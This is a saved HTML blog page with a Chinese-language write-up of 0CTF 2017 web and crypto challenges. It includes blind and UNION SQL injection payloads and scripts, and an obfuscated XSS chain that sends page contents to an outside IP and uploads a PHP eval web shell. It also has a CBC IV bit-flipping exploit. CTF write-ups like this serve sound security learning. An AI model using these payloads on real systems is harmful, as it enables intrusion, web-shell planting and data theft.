@@ -1,0 +1,1076 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./0CTF2017-WEB-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./0CTF2017-WEB-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./0CTF2017-WEB-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./0CTF2017-WEB-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./0CTF2017-WEB-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./0CTF2017-WEB-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./0CTF2017-WEB-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h2 id="temmostinyshop">Temmo&amp;apos;s Tiny Shop</h2>
+<p style="max-width:100%;height:auto;">这道题运气比较好，一进去就有很多钱，然后直接买到hint了，后来像是修复了，hint内容也做了修改，不过还是有问题，我重新申请了一个号，发现越买钱越多，然后就直接买到hint了，在后来写wp的时候去申请发现无论怎么酒只有4000，最后做完题看到flag，知道这是个条件竞争的题。
+不说了，先直接说最后的注入把，因为前面的步骤由于出题方的失误我们直接就能跳过了。
+最后hint就是</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">select flag from ce63e444b0d049e9c899c9a0336b3c59
+</code></pre>
+<p style="max-width:100%;height:auto;">显然就是寻找注入点，后来在这里找到了注入点，搜索那儿的<code style="max-width:100%;height:auto;">order by</code>,然后随便买两个东西，比如这两个
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0cc64c2adc57ed000007.png" style="max-width:100%;height:auto;"/><br/>
+然后在我们输入下面payload时</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name)
+</code></pre>
+<p style="max-width:100%;height:auto;">结果为：
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0d1a4c2adc57ed000008.png" style="max-width:100%;height:auto;"/><br/>
+而输入下面的时候</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x46),price,name)
+</code></pre>
+<p style="max-width:100%;height:auto;">结果变成了
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0d2f4c2adc57ed000009.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以通过if然后根据其按照什么进行排序就能够成功判断每一位的flag
+最后脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+r=requests.session()
+url="http://202.120.7.197/app.php"
+header={"Cookie":"PHPSESSID=5h8kk889lad5a6akggcm14bgr7"}
+ans=""
+for i in xrange(1,100):
+    for j in xrange(256):
+        if j==37:
+            continue
+        param="?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i),num=hex(j))
+        print param
+        content=r.get(url+param,headers=header).content
+        #print content
+        print j
+        if content.find(&amp;apos;"id":"5"&amp;apos;)&gt;content.find(&amp;apos;"id":"2"&amp;apos;):
+            print j
+            ans+=chr(j)
+            print ans.lower()
+            break
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0df94c2adc57ed00000a.png" style="max-width:100%;height:auto;"/><br/>
+替换下大括号就行了。</p>
+<h2 id="kingofgloryplayerlist">King of Glory Player List</h2>
+<p style="max-width:100%;height:auto;">一道调试js的题,看了源码主要部分如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">function go()
+{
+    args = GetUrlParms();
+    if(args["id"]!=undefined)
+    {
+        var value = args["id"];
+        var ar = Module.main(value).split("|");
+        if(ar.length==3)
+        {
+            var s = "http://202.120.7.213:11181/api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1];
+            window.location.href=s;
+            $(document).ready(function(){
+              content=$.ajax({url:s, async:false});
+              $("#output").html(content.responseText);
+            });
+
+        }
+        if((ar.length==1)&amp;(ar[0]==&amp;apos;WrongBoy&amp;apos;))
+        {
+            alert(&amp;apos;Hello Hacker~&amp;apos;);
+        }
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">源码会根据我们输入调用<code style="max-width:100%;height:auto;">Module.main()</code>函数，如果我们输入有敏感字符，就会返回<code style="max-width:100%;height:auto;">wrongboy</code>，否则返回正常的格式，包括<code style="max-width:100%;height:auto;">hash</code>。
+也就是我们的核心目的就是要在我们非正常输入的情况下让它返回正常的格式然后进行相关操作。
+所以我们只需要开两个窗口，一个正常输入，一个非正常输入，然后借助浏览器的调试器进行调试js就可以了，开始用的火狐的，卡爆了，后来换成chrome就流畅了。之前<code style="max-width:100%;height:auto;">HCTF2016</code>也有类似的题。
+单步跟进之后到这里遇到第一个，<code style="max-width:100%;height:auto;">function.js</code>的7633行的<code style="max-width:100%;height:auto;">$13</code>变量，正常输入是true,敏感输入是false，
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd05d64c2adc57ed000003.png" style="max-width:100%;height:auto;"/><br/>
+那直接修改源码赋为真值就可以了
+第二处在这个判断这里
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd06ae4c2adc57ed000004.png" style="max-width:100%;height:auto;"/><br/>
+这个label的值，正确的时候是0,错的时候是12，即错误了就会进入这个if语句，那么我们直接把它改成<code style="max-width:100%;height:auto;">if(0)</code>就好了。
+之后就没有了，就能正常的注入了，不过由于同源策略的原因，异步请求交不过去，所以把源码改成如下</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;King of Glory Player List&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;script
+  src="https://code.jquery.com/jquery-3.1.1.min.js"
+  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="
+  crossorigin="anonymous"&gt;&lt;/script&gt;
+&lt;script src="function1.js"&gt;&lt;/script&gt;
+&lt;script type="text/javascript"&gt;
+function GetUrlParms()
+{
+    var args=new Object();
+    var query=location.search.substring(1);
+    var pairs=query.split("&amp;");
+    for(var i=0;i&lt;pairs.length;i++)
+    {
+        var pos=pairs[i].indexOf(&amp;apos;=&amp;apos;);
+        if(pos==-1) continue;
+        var argname=pairs[i].substring(0,pos);
+        var value=pairs[i].substring(pos+1);
+        args[argname]=unescape(value);
+    }
+    return args;
+}
+function go()
+{
+    args = GetUrlParms();
+    if(args["id"]!=undefined)
+    {
+        var value = args["id"];
+        var ar = Module.main(value).split("|");
+        if(ar.length==3)
+        {
+            var s = "http://202.120.7.213:11181/api.php?id=" + args["id"] + "&amp;hash=" + ar[0] + "&amp;time=" + ar[1];
+            window.location.href=s;
+            $(document).ready(function(){
+              content=$.ajax({url:s, async:false});
+              $("#output").html(content.responseText);
+            });
+
+        }
+        if((ar.length==1)&amp;(ar[0]==&amp;apos;WrongBoy&amp;apos;))
+        {
+            alert(&amp;apos;Hello Hacker~&amp;apos;);
+        }
+    }
+}
+
+var wait = setInterval(function(){if(Module.main != undefined){clearInterval(wait);go();}}, 100);
+
+&lt;/script&gt;
+&lt;center&gt;&lt;h1&gt;King of Glory Player List&lt;/h1&gt;&lt;/center&gt;
+&lt;center&gt;&lt;div id="output"&gt;&lt;h2&gt;hmmmm&lt;/h2&gt;&lt;/div&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;"><code style="max-width:100%;height:auto;">function1.js</code>就是我们调整过得,接下来就能正常的发送请求了。</p>
+<p style="max-width:100%;height:auto;">发现服务端并没有再进行过滤了，然后由这个payload</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 order by 2
+id=1 order by 3
+</code></pre>
+<p style="max-width:100%;height:auto;">确定是2列了。
+然后开始爆破
+爆的表名有<code style="max-width:100%;height:auto;">fl4g,user</code>
+<code style="max-width:100%;height:auto;">fl4g</code>列名就一个<code style="max-width:100%;height:auto;">hey</code>
+所以</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">?id=1 and 1=2 union select 1,hey from fl4g
+</code></pre>
+<p style="max-width:100%;height:auto;">拿到flag。
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd08764c2adc57ed000005.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="simplesqlin">simplesqlin</h2>
+<p style="max-width:100%;height:auto;">一听名字就大概知道是个sql注入，简单判断下是个数字注入
+然后试了试，同样通过orderby判断出有三列。
+然后发现select被过滤了，然后发现插入%00之后就能绕过</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 and 1=2 union se%00lect 1,2,3
+</code></pre>
+<p style="max-width:100%;height:auto;">接下来有可以爆破了，之后的from和where都被过滤了。
+同样可以插入%00进行绕过，得到表名<code style="max-width:100%;height:auto;">flag,news</code>
+<code style="max-width:100%;height:auto;">flag</code>表的列名也是<code style="max-width:100%;height:auto;">flag</code>
+所以,payload如下：</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">id=1 and 1=2 union s%00elect 1,flag,3 fro%00m flag
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0b024c2adc57ed000006.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="complicatedxss">complicated xss</h2>
+<p style="max-width:100%;height:auto;">这道题坑了我好久啊。。。
+爆破md5就不说了，遇见的次数已经太多了。直接主题
+首先是正常的xss点，说是让你访问<code style="max-width:100%;height:auto;">http://admin.government.vip:8000</code>就能拿到flag了，然后我们试图访问一下这个网页发现有个默认用户，登陆进去之后打印了用户名，即cookie里面<code style="max-width:100%;height:auto;">username</code>值，那我们的想法就是想办法伪造带标签的cookie，然后跳转过去之后就能执行标签页内容。
+另外需要注意的是
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cde12fc8d9b11b6e000000.png" style="max-width:100%;height:auto;"/><br/>
+在这个页面上述的函数都无法使用。</p>
+<p style="max-width:100%;height:auto;">然后我们开始尝试</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;script&gt;
+ function setCookie(name,value,seconds) {
+ seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
+ var expires = "";
+ if (seconds != 0 ) { //设置cookie生存时间
+ var date = new Date();
+ date.setTime(date.getTime()+(seconds*1000));
+ expires = "; expires="+date.toGMTString();
+ }
+ document.cookie = name+"="+value+expires+";path=/;domain=.government.vip"; //转码并赋值
+
+}
+setCookie(&amp;apos;username&amp;apos;,String.fromCharCode(60,115,118,103,32,111,110,108,111,97,100,61,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,52,46,49,54,48,46,52,51,46,49,53,52,58,49,50,51,52,53,47,63,97,61,39,43,101,115,99,97,112,101,40,100,111,99,117,109,101,110,116,46,98,111,100,121,46,105,110,110,101,114,72,84,77,76,41,62),1000);
+location.href=&amp;apos;http://admin.government.vip:8000/&amp;apos;;
+&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">通过这个代码我们成功跳转了过去并且拿到了返回值。
+结果目的网页的内容是一个上传表单如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;p&gt;Upload your shell&lt;/p&gt;
+&lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
+&lt;p&gt;&lt;input type="file" name="file"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;input type="submit" value="upload"&gt;
+&lt;/p&gt;&lt;/form&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">也就是说我们还要在<code style="max-width:100%;height:auto;">http://admin.government.vip:8000</code>页面下执行post请求上传文件，构造了好久，最后还是觉得jquery好用啊。
+最后这里引入了iframe,然后利用<code style="max-width:100%;height:auto;">this.contentWindow</code>对象来绕过<code style="max-width:100%;height:auto;">eval</code>的执行。
+最后构造如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;"> &lt;script&gt;
+ function setCookie(name, value, seconds) {
+ seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
+ var expires = "";
+ if (seconds != 0 ) { //设置cookie生存时间
+ var date = new Date();
+ date.setTime(date.getTime()+(seconds*1000));
+ expires = "; expires="+date.toGMTString();
+ }
+ document.cookie = name+"="+value+expires+";path=/;domain=.government.vip"; //转码并赋值
+}
+setCookie(&amp;apos;username&amp;apos;,&amp;apos;&lt;iframe onload=this.contentWindow.eval(String.fromCharCode(118,97,114,32,98,100,119,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,98,100,119,46,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,98,101,110,100,97,119,97,110,103,46,115,105,116,101,58,56,48,48,48,47,109,121,106,115,47,117,112,108,111,97,100,95,97,106,97,120,46,106,115,34,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,98,100,119,41,59))&gt;&lt;/iframe&gt;&amp;apos;,1000)
+location.href=&amp;apos;http://admin.government.vip:8000/&amp;apos;;
+&lt;/script&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">中间那一串的<code style="max-width:100%;height:auto;">String.fromCharCode</code>就是</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var bdw=document.createElement("script");bdw.src="http://www.bendawang.site:8000/myjs/upload_ajax.js";document.head.appendChild(bdw);
+</code></pre>
+<p style="max-width:100%;height:auto;">然后在我的vps上我的<code style="max-width:100%;height:auto;">upload_ajax.js</code>如下：</p>
+<pre><code class="js language-js" style="max-width:100%;height:auto;">var t=document.getElementsByTagName("script")[0];
+var sss=document.createElement("script");
+sss.src="http://government.vip/static/jquery.min.js";
+document.head.insertBefore(sss,t);
+
+var body = "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"233\"\r\n" +
+  "\r\n" +
+  "eyJzY3JlZW5faGVpZ2h0Ijo4MjYsInNjcmVlbl93aWR0aCI6MTQ0MH0\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"source_flag\"\r\n" +
+  "\r\n" +
+  "0\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
+  "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n" +
+  "Content-Type: image/png\r\n" +
+  "\r\n" +
+  "GIF89a\x3c?php eval($_REQUEST[A]);?\x3e\x3c/script\x3e\r\n" +
+  "------WebKitFormBoundaryFikh4XTsUA3KuSES--\r\n";
+
+setTimeout("makeRequest()",1000)
+
+function makeRequest() {
+    var settings = {
+        type: "POST",
+        url:"http://admin.government.vip:8000/upload",
+        data:body,
+        success: function(data,textStatus) {
+            $.get(&amp;apos;http://104.160.43.154:12345?a=123+&amp;apos;+data);
+        },
+        headers: {
+            "Access-Control-Allow-Headers":"X-Requested-With",
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFikh4XTsUA3KuSES",
+            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language":"zh-CN,zh;q=0.8"
+        }
+    };
+    $.ajax(settings);
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">中间的延迟是为了让我创建的引入<code style="max-width:100%;height:auto;">jquery</code>的标签生效，这样<code style="max-width:100%;height:auto;">makeRequest</code>才能正常执行，最后这里要吐槽的是我用的火日大佬的xss平台，每次服务器给我的平台发请求，我的平台就崩了，导致最后只能使用nc监听端口，蓝瘦，下面是截图</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cde2b5c8d9b11b6e000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="simplexss">simple xss</h2>
+<p style="max-width:100%;height:auto;">同样的套路，用md5和验证码防爆破，目的就是绕过过滤执行js拿回flag.php下数据
+然后好的就是这个可以测试
+经过一番fuzz之后发现一下重要符号被过滤</p>
+<pre><code style="max-width:100%;height:auto;">&amp;apos; " : / &gt; . ( ) &amp;  # , % ; ?等等
+</code></pre>
+<p style="max-width:100%;height:auto;">首先简单确认之后我们可以引入像是<code style="max-width:100%;height:auto;">script,img,svg,link</code>等关键标签。
+这么多过滤势必没办法直接执行语句访问flag.php，那么就想到要么引入我们自己的js，要么加载我们写的界面。然后要输入网址的话，既然说了是最新版本的chrome，就可以用<code style="max-width:100%;height:auto;">。</code>绕过<code style="max-width:100%;height:auto;">.</code>，然后就是用<code style="max-width:100%;height:auto;">\\</code>使得其用当前协议<code style="max-width:100%;height:auto;">https</code>访问链接，payload如下：</p>
+<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;link rel=prefetch href=\\61dclub。com\x
+还有import，以及prerender应该也可以不过没有尝试，凡是预加载和预渲染已经直接调用理论上都可以
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58ce593105e5ac4c79000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="cryptointegrity">crypto-integrity</h2>
+<p style="max-width:100%;height:auto;">首先拿到源代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">#!/usr/bin/python -u
+
+from Crypto.Cipher import AES
+from hashlib import md5
+from Crypto import Random
+from signal import alarm
+
+BS = 16
+pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
+unpad = lambda s : s[0:-ord(s[-1])]
+
+
+class Scheme:
+    def __init__(self,key):
+        self.key = key
+
+    def encrypt(self,raw):
+        raw = pad(raw)
+        raw = md5(raw).digest() + raw
+
+        iv = Random.new().read(BS)
+        cipher = AES.new(self.key,AES.MODE_CBC,iv)
+
+        return ( iv + cipher.encrypt(raw) ).encode("hex")
+
+    def decrypt(self,enc):
+        enc = enc.decode("hex")
+
+        iv = enc[:BS] ##前16位
+        enc = enc[BS:] ##之后
+
+        cipher = AES.new(self.key,AES.MODE_CBC,iv)
+        blob = cipher.decrypt(enc)
+
+        checksum = blob[:BS]
+        data = blob[BS:]
+
+        if md5(data).digest() == checksum:
+            return unpad(data)
+        else:
+            return
+
+key = Random.new().read(BS)
+scheme = Scheme(key)
+
+flag = open("flag",&amp;apos;r&amp;apos;).readline()
+alarm(30)
+
+print "Welcome to 0CTF encryption service!"
+while True:
+    print "Please [r]egister or [l]ogin"
+    cmd = raw_input()
+
+    if not cmd:
+        break
+
+    if cmd[0]==&amp;apos;r&amp;apos; :
+        name = raw_input().strip()
+
+        if(len(name) &gt; 32):
+            print "username too long!"
+            break
+        if pad(name) == pad("admin"):
+            print "You cannot use this name!"
+            break
+        else:
+            print "Here is your secret:"
+            print scheme.encrypt(name)
+
+
+    elif cmd[0]==&amp;apos;l&amp;apos;:
+        data = raw_input().strip()
+        name = scheme.decrypt(data)
+
+        if name == "admin":
+            print "Welcome admin!"
+            print flag
+        else:
+            print "Welcome %s!" % name
+    else:
+        print "Unknown cmd!"
+        break
+</code></pre>
+<p style="max-width:100%;height:auto;">初步想法是<code style="max-width:100%;height:auto;">padding oracle</code>，但是后来看到有个<code style="max-width:100%;height:auto;">alarm(30)</code>，只有30s的话就不可能是<code style="max-width:100%;height:auto;">padding oracle</code>了，因为就这个通信速度来看30s完全差得远。
+也就是说有别的解法了。
+然后想到hash长度扩展攻击的原理。
+这里有点类似的。
+比如我注册一个账户是<code style="max-width:100%;height:auto;">admin\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b\0bbdw</code>
+然后服务端返回如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">f751a16eae391dd0f4dbfb5c4a740217  md5值
+14c63b729049860cb9905a2ae3d71807  admin\x0b\x0b...
+3f17049464bbc44f1bdccde9ea233d1f  bdw\x0d\x0d.....
+17ba7e5a78c1fa77811a0c72a519adea  \0x10\0x10......
+</code></pre>
+<p style="max-width:100%;height:auto;">然后我们想伪造的是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">md5值
+admin\x0b\x0b...
+</code></pre>
+<p style="max-width:100%;height:auto;">也就简单了，我们只需要把第一次注册的MD5通过修改IV进行字节翻转成<code style="max-width:100%;height:auto;">admin\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b\0b</code>的md5就可以了。
+所以代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">from pwn import *
+from hashlib import md5
+N=16
+def inject1(cipher):
+    print cipher
+    con.recvuntil("[l]ogin")
+    #con.interactive()
+    con.sendline(&amp;apos;l&amp;apos;)
+    con.sendline(cipher)
+    content=con.recvuntil("!")
+    print content
+    if "None" in content:
+        return 0
+    else:
+        return 1
+
+def xor(a, b):
+    return "".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])
+
+pad = lambda s:s+(N-len(s)%N)*chr(N-len(s)%N)
+
+def padding_oracle(N,cipher):
+    get=""
+    for i in xrange(1,N+1):
+        for j in xrange(0,256):
+            padding=xor(get,chr(i)*(i-1))
+            c=chr(0)*(16-i)+chr(j)+padding+cipher
+            c=c.encode(&amp;apos;hex&amp;apos;)
+            print c
+            if inject1(c):
+                get=chr(j^i)+get
+                time.sleep(0.1)
+                break
+    return get
+
+con=remote(&amp;apos;202.120.7.217&amp;apos;,8221)
+con.recvuntil("[l]ogin")
+con.sendline(&amp;apos;r&amp;apos;)
+username=pad(&amp;apos;admin&amp;apos;)+&amp;apos;bdw&amp;apos;
+con.sendline(username)
+con.recvuntil("secret:")
+c=con.recvuntil("P")
+print c
+iv=c[1:-2].decode(&amp;apos;hex&amp;apos;)[:16]
+cipher=c[1:-2].decode(&amp;apos;hex&amp;apos;)[16:48]
+#middle=padding_oracle(N,cipher)
+plaintext=md5(pad(username)).digest()
+des=md5(pad("admin")).digest()
+tmp=xor(xor(iv,plaintext),des)
+inject1((tmp+cipher).encode(&amp;apos;hex&amp;apos;))
+con.interactive()
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cdfe55c8d9b11b6e000002.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="static/images/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h2 id="temmostinyshop">Temmo&amp;apos;s Tiny Shop</h2>
+<p style="max-width:100%;height:auto;">这道题运气比较好，一进去就有很多钱，然后直接买到hint了，后来像是修复了，hint内容也做了修改，不过还是有问题，我重新申请了一个号，发现越买钱越多，然后就直接买到hint了，在后来写wp的时候去申请发现无论怎么酒只有4000，最后做完题看到flag，知道这是个条件竞争的题。
+不说了，先直接说最后的注入把，因为前面的步骤由于出题方的失误我们直接就能跳过了。
+最后hint就是</p>
+<pre><code class="mysql language-mysql" style="max-width:100%;height:auto;">select flag from ce63e444b0d049e9c899c9a0336b3c59
+</code></pre>
+<p style="max-width:100%;height:auto;">显然就是寻找注入点，后来在这里找到了注入点，搜索那儿的<code style="max-width:100%;height:auto;">order by</code>,然后随便买两个东西，比如这两个
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0cc64c2adc57ed000007.png" style="max-width:100%;height:auto;"/><br/>
+然后在我们输入下面payload时</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x00),price,name)
+</code></pre>
+<p style="max-width:100%;height:auto;">结果为：
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0d1a4c2adc57ed000008.png" style="max-width:100%;height:auto;"/><br/>
+而输入下面的时候</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),1,1)like(0x46),price,name)
+</code></pre>
+<p style="max-width:100%;height:auto;">结果变成了
+<br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0d2f4c2adc57ed000009.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">所以通过if然后根据其按照什么进行排序就能够成功判断每一位的flag
+最后脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+r=requests.session()
+url="http://202.120.7.197/app.php"
+header={"Cookie":"PHPSESSID=5h8kk889lad5a6akggcm14bgr7"}
+ans=""
+for i in xrange(1,100):
+    for j in xrange(256):
+        if j==37:
+            continue
+        param="?action=search&amp;keyword=&amp;order=if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i),num=hex(j))
+        print param
+        content=r.get(url+param,headers=header).content
+        #print content
+        print j
+        if content.find(&amp;apos;"id":"5"&amp;apos;)&gt;content.find(&amp;apos;"id":"2"&amp;apos;):
+            print j
+            ans+=chr(j)
+            print ans.lower()
+            break
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./0CTF2017-WEB-WriteUp/58cd0df94c2adc57ed00000a.png" style="max-width:100%;height:auto;"/><br/>
+替换下大括号就行了。</p>
+<h2 id="kingofgloryplayerlist">King of Glory Player List</h2>
